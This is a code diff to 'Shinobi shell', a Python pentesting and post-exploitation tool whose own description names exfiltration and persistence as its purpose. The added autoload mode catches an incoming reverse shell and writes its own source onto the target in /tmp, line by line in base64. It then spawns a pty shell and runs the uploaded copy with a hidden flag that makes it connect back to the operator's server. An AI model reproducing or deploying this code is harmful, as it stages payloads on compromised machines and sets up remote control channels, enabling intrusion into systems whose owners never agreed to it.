@@ -1,4 +1,5 @@
-#! /usr/bin/python
+#!/usr/bin/python
+
 import os
 import cmd
 import sys
@@ -33,11 +34,12 @@ except ImportError:
 parser = argparse.ArgumentParser(description='Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.', prog='PROG', usage='%(prog)s [options]')
 
 parser.add_argument('-t', '--ttyCheat', help='Shows tty shell cheat sheet', action="store_true")
+parser.add_argument('-a', '--autoload', help='Listens for a incoming shell. Then autoloads shinobi shell onto the target', action="store_true")
 parser.add_argument('-c',  '--connect', help='Flag that indicates a reverse shell connection', action="store_true")
-#parser.add_argument('-a', '--address', help='ip:port - The machine address with a Shinobi Shell listener running')
 parser.add_argument('-l', '--listen', help='Starts Shinobi Shell listener on port passed in')
 parser.add_argument('-k', '--key', help='Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients', action="store_true")
 parser.add_argument('-r', '--serveraddress', help='Local IP Address used for universal reverse shell handler')
+parser.add_argument('-x', '--dontuse', help='This flag is used by the auto shell injection. Don\'t use it, nothing happens')
 
 #The Shinobi Shell command prompt
 CMDPROMPT="|Shinobi[sh]ell|->:~$"
@@ -725,6 +727,10 @@ def setupShinobiShellListener(port):
 if(args["serveraddress"]):
 	serverAddress = args["serveraddress"]
 
+if(args["dontuse"]):
+	serverAddress = args["dontuse"]
+	connectToShinobiShellServer(serverAddress)
+
 if(args["connect"]):
 	serveraddr = raw_input('Enter Server Address and port ~> example: 127.0.0.1:8080 : ')
 	connectToShinobiShellServer(serveraddr)
@@ -745,3 +751,59 @@ if(args["listen"]):
 
 if(args["ttyCheat"]):
 	displayPtyCheetSheet()
+
+if(args["autoload"]):
+	port = raw_input("Which port to listen on: ")
+	serveraddress = raw_input("What is the ShinobiServer address:port combination: ")
+
+	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	serversocket.bind(('0.0.0.0', int(port)))
+	serversocket.listen(1) 
+	connection, address = serversocket.accept()
+	connection.send('whoami \x0a')
+	response = connection.recv(1024)
+	print("Current User: " + response)
+	if(len(response) > 0):
+		print("Opening source file: " + sys.argv[0])
+		shinobiShellSource = open(sys.argv[0]).readlines()
+		
+		print("Source File Length: " + str(len(shinobiShellSource)))
+		
+		connection.send('cd /tmp; pwd; \x0a')
+		print("Current DIR: " + connection.recv(1024))
+		
+		print('Uploading shell')
+		for line in shinobiShellSource:
+			encodedLine = base64.b64encode(line)
+			connection.send('echo ' + encodedLine + ' | base64 -d >> tempShinobiShell.py\x0a')
+
+		print('Payload Sent...')
+
+		connection.send('which python  \x0a')
+		pythonPath = connection.recv(1024).strip()
+
+		print('Starting tty shell...')
+		connection.send(pythonPath + ' -c "import pty; pty.spawn(\'/bin/sh\')"\x0a')
+		response = connection.recv(1024).strip()
+		print(response)
+		
+		print('Starting shell')
+		connection.send(pythonPath + " tempShinobiShell.py -x " + serveraddress + " 0<&1  \x0a")
+
+
+		print('Shell started!')
+
+		
+		while True:		
+			while True:
+				response = connection.recv(1024).strip()			
+				if("|Shinobi[sh]ell|" in response):
+					sys.stdout.write(response)
+					break
+				else:
+					print(response)
+					
+			connection.send(raw_input() + " \x0a")
+
+
+		print('Connection Closed')
